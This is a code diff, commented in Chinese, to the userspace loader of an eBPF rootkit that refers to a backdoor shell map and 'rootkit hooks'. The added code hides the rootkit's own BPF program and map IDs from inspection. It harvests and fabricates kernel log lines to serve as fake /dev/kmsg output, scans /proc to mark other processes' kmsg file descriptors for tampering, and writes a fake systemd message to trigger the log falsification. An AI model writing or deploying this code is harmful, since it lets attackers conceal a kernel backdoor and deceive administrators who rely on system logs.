@@ -17,10 +17,10 @@
 #include <locale.h>
 #include <dlfcn.h>
 #include <link.h>
-
+#include <stdlib.h>      // 提供 atoi
+#include <dirent.h>      // 提供 DIR, opendir, readdir, DT_DIR
 #include <bpf/bpf.h>
 
-#include "kit.skel.h"
 
 #include "../common/constants.h"
 #include "../common/map_common.h"
@@ -30,6 +30,7 @@
 #include "include/utils/network/ssl_client.h"
 #include "include/utils/mem/injection.h"
 
+#include "kit.skel.h"
 #define ABORT_IF_ERR(err, msg)\
 	if(err<0){\
 		fprintf(stderr, msg);\
@@ -130,6 +131,212 @@ static volatile bool exiting = false;
 static void sig_handler(int sig){
 	exiting = true;
 }
+
+//自隐藏初始化代码
+//修改后的自隐藏初始化代码（仅处理 Map 和 Prog ID）
+static int setup_self_hiding(struct kit_bpf *skel) {
+    __u32 err;
+    __u32 hide_val = 0xFFFFFFFF; 
+
+    // 1. 程序 ID 隐藏
+    struct bpf_program *prog;
+    bpf_object__for_each_program(prog, skel->obj) {
+        struct bpf_prog_info info = {};
+        __u32 info_len = sizeof(info);
+        int fd = bpf_program__fd(prog);
+        
+        err = bpf_obj_get_info_by_fd(fd, &info, &info_len);
+        if (err == 0) {
+            bpf_map_update_elem(bpf_map__fd(skel->maps.bpf_programs), &info.id, &hide_val, BPF_ANY);
+        }
+    }
+
+    // 2. Map ID 隐藏
+    struct bpf_map *map;
+    bpf_object__for_each_map(map, skel->obj) {
+        struct bpf_map_info info = {};
+        __u32 info_len = sizeof(info);
+        int fd = bpf_map__fd(map);
+
+        err = bpf_obj_get_info_by_fd(fd, &info, &info_len);
+        if (err == 0) {
+            bpf_map_update_elem(bpf_map__fd(skel->maps.bpf_maps), &info.id, &hide_val, BPF_ANY);
+        }
+    }
+	__u32 sentinel = 0xFFFFFFFF;
+    __u32 key_prog = 0; // 对应程序的哨兵位
+    __u32 key_map = 1;  // 对应 Map 的哨兵位
+    
+    int next_id_fd = bpf_map__fd(skel->maps.bpf_next_id);
+    
+    
+    bpf_map_update_elem(next_id_fd, &key_prog, &sentinel, BPF_ANY);
+    bpf_map_update_elem(next_id_fd, &key_map, &sentinel, BPF_ANY);
+    return 0;
+}
+
+/**
+ * 采集并初始化假日志剧本
+ * 返回 0 表示成功，-1 表示关键 Map 无法访问
+ */
+static int setup_kmsg_theater(struct kit_bpf *skel) {
+    // 1. 获取 Map 的文件描述符
+    int map_fd = bpf_map__fd(skel->maps.fa_kmsgs);
+    if (map_fd < 0) {
+        fprintf(stderr, "[-] Error: Failed to get fa_kmsgs map FD\n");
+        return -1;
+    }
+
+    // 2. 尝试打开真实的 kmsg 获取信息
+    FILE *fp = fopen("/dev/kmsg", "r");
+    char line[256];
+    __u32 key = 0;
+    
+    printf("[+] Loading kmsg theater scripts...\n");
+
+    if (fp) {
+        // 读取真实的系统日志，挑选看起来“官方”的存入 Map
+        // 注意：此时我们还没挂钩 read，所以读到的是真实数据
+        while (fgets(line, sizeof(line), fp) && key < FAKE_KMSG_COUNT) {
+            // 过滤：挑选无害的系统级日志
+            if (strstr(line, "systemd") || strstr(line, "eth0") || 
+                strstr(line, "PCI") || strstr(line, "USB") || strstr(line, "acpi")) {
+                
+                struct kmsg_data_t data = {0};
+                
+                // 跳过 kmsg 消息前缀（格式如 "6,123,456,-;"）
+                char *msg_content = strchr(line, ';');
+                if (msg_content) {
+                    msg_content++; // 移至分号后的内容
+                } else {
+                    msg_content = line;
+                }
+
+                data.len = strlen(msg_content);
+                // 限制长度，防止溢出缓冲区
+                unsigned int copy_len = data.len < (sizeof(data.content)) ? 
+                                       data.len : (sizeof(data.content) - 1);
+                
+                memcpy(data.content, msg_content, copy_len);
+                // 确保字符串以 null 结尾
+                data.content[copy_len] = '\0';
+
+                if (bpf_map_update_elem(map_fd, &key, &data, BPF_ANY) != 0) {
+                    break;
+                }
+                key++;
+            }
+        }
+        fclose(fp);
+    }
+
+    // 3. 兜底逻辑：如果系统日志太少，用预设的“万金油”填满剩余槽位
+    const char *backup_logs[] = {
+        "systemd[1]: Reached target Multi-User System.\n",
+        "systemd[1]: Reached target Graphical Interface.\n",
+        "systemd[1]: Finished Initialize default Netplan configuration.\n",
+        "systemd[1]: Started Network Time Service.\n",
+        "systemd[1]: Started Dispatcher daemon for systemd-networkd.\n"
+    };
+
+    int backup_count = sizeof(backup_logs) / sizeof(backup_logs[0]);
+    while (key < FAKE_KMSG_COUNT) {
+        struct kmsg_data_t data = {0};
+        const char *msg = backup_logs[key % backup_count];
+        
+        data.len = strlen(msg);
+        memcpy(data.content, msg, data.len);
+        
+        bpf_map_update_elem(map_fd, &key, &data, BPF_ANY);
+        key++;
+    }
+
+    printf("[+] Theater ready: %u logs active.\n", key);
+    return 0;
+}
+
+/**
+ * 遍历 /proc 查找所有打开了 /dev/kmsg 的进程 FD
+ */
+static int block_existing_kmsg_fds(struct kit_bpf *skel) {
+    DIR *proc = opendir("/proc");
+    if (!proc) return -1;
+
+    struct dirent *entry;
+    int blocked_count = 0;
+    int fd_map = bpf_map__fd(skel->maps.kmsg_fds);
+
+    while ((entry = readdir(proc))) {
+        if (entry->d_type != DT_DIR) continue;
+        
+        int pid = atoi(entry->d_name);
+        if (pid <= 0 || pid == getpid()) continue; // 跳过非法 PID 和 Rootkit 自身
+
+        // 1. 读取进程名称 (comm)
+        char comm_path[256], comm[32] = {0};
+        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
+        FILE *comm_f = fopen(comm_path, "r");
+        
+        if (comm_f) {
+            if (fgets(comm, sizeof(comm), comm_f)) {
+                // 去掉末尾换行符
+                comm[strcspn(comm, "\n")] = 0;
+            }
+            fclose(comm_f);
+
+            // --- 核心优化：白名单过滤 ---
+            // 如果是 Hyper-V 同步组件或系统日志核心服务，绝不阻塞
+            if (strstr(comm, "hv_") || strstr(comm, "vmbus") || 
+                strstr(comm, "udevd") || strstr(comm, "systemd-journal")) {
+                continue; 
+            }
+        }
+
+        // 2. 检查该进程的 FD 列表
+        char fd_dir_path[256];
+        snprintf(fd_dir_path, sizeof(fd_dir_path), "/proc/%d/fd", pid);
+        DIR *fd_dir = opendir(fd_dir_path);
+        if (!fd_dir) continue;
+
+        struct dirent *fd_entry;
+        while ((fd_entry = readdir(fd_dir))) {
+            if (fd_entry->d_name[0] == '.') continue;
+
+            char link_path[512], real_path[512];
+            snprintf(link_path, sizeof(link_path), "%s/%s", fd_dir_path, fd_entry->d_name);
+            
+            ssize_t len = readlink(link_path, real_path, sizeof(real_path) - 1);
+            if (len != -1) {
+                real_path[len] = '\0';
+                // 只拦截指向 /dev/kmsg 的文件描述符
+                if (strcmp(real_path, "/dev/kmsg") == 0) {
+					__u32 fd_num = (__u32)atoi(fd_entry->d_name);
+					// 构造复合键：(PID << 32) | FD
+					__u64 compound_key = ((__u64)pid << 32) | fd_num;
+					__u32 mark = 1;
+					bpf_map_update_elem(fd_map, &compound_key, &mark, BPF_ANY);
+					blocked_count++;
+				}
+            }
+        }
+        closedir(fd_dir);
+    }
+    closedir(proc);
+    printf("[+] Precised blocking complete. %d FDs suppressed.\n", blocked_count);
+    return blocked_count;
+}
+
+
+static void flush_kmsg_buffer() {
+    FILE *f = fopen("/dev/kmsg", "w");
+    if (f) {
+        // 这一条消息会成为“引信”，触发所有读取进程的篡改逻辑
+        fprintf(f, "systemd[1]: Resync Network Time Service.\n");
+        fclose(f);
+        printf("[+] Kmsg buffer flushed with fake heartbeat.\n");
+    }
+}
+
 
 /**
  * @brief Manages an event received via the ring buffer
@@ -275,10 +482,10 @@ int main(int argc, char**argv){
 	struct bpf_map_info map_expect = {0};
 	struct bpf_map_info info = {0};
     __u32 err;
-
+	bool hide_myself=false; //控制自隐藏
 	/* Parse command line arguments */
 	int opt;
-	while ((opt = getopt(argc, argv, ":t:vh")) != -1) {
+	while ((opt = getopt(argc, argv, ":t:vhH")) != -1) {
         switch (opt) {
         case 't':
             ifindex = if_nametoindex(optarg);
@@ -315,7 +522,9 @@ int main(int argc, char**argv){
             printf("Missing arguments for %c\n", optopt);
             exit(EXIT_FAILURE);
             break;
-        
+        case 'H':
+			hide_myself = true;
+			break;
         default:
             print_help_dialog(argv[0]);
             exit(EXIT_FAILURE);
@@ -338,7 +547,8 @@ int main(int argc, char**argv){
 		fprintf(stderr, "Failed to open and load BPF skeleton\n");
 		return 1;
 	}
-
+	// --- 移植点 A: 此时 Skeleton 已打开但未加载，可以设置全局变量 ---
+    skel->rodata->TARGET_PID = getpid();
 	
 	
 	//Load & verify BPF program
@@ -346,6 +556,19 @@ int main(int argc, char**argv){
 	if (err) {
 		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
 		goto cleanup;
+	}
+	// 在程序真正挂载（Attach）前，执行注销动作
+    // 此时内核已经分配了 ID，但管理员还没来得及看
+	if(hide_myself){
+		    err = setup_self_hiding(skel);
+			if (err) {
+				fprintf(stderr, "Failed to setup self-hiding\n");
+			}
+			err = setup_kmsg_theater(skel);
+			if (err < 0) {
+				printf("[-] Warning: Kmsg theater initialization failed, but continuing...\n");
+			}
+			block_existing_kmsg_fds(skel);
 	}
 
 	FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
@@ -407,7 +630,7 @@ int main(int argc, char**argv){
 	if(err!=0){
 		perror("ERROR setting up the rootkit hooks");
 	}
-
+	flush_kmsg_buffer();
 	// Set up ring buffer polling --> Main communication buffer kernel->user
 	rb = ring_buffer__new(bpf_map__fd(skel->maps.rb_comm), handle_rb_event, NULL, NULL);
 	if (rb==NULL) {
